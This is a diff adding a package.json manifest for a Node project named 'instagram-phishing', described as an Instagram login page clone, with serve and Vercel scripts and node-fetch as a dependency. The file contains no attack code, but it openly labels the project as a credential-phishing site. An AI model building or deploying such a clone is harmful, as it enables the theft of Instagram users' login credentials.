@@ -1,0 +1,22 @@
+{
+  "name": "instagram-phishing",
+  "version": "1.0.0",
+  "description": "Instagram login page clone",
+  "main": "index.html",
+  "scripts": {
+    "dev": "vercel dev",
+    "start": "serve .",
+    "build": "echo 'No build step required'"
+  },
+  "dependencies": {
+    "node-fetch": "^2.6.7",
+    "serve": "^14.0.0"
+  },
+  "devDependencies": {
+    "@vercel/node": "^2.0.0"
+  },
+  "engines": {
+    "node": "18.x"
+  },
+  "license": "MIT"
+}
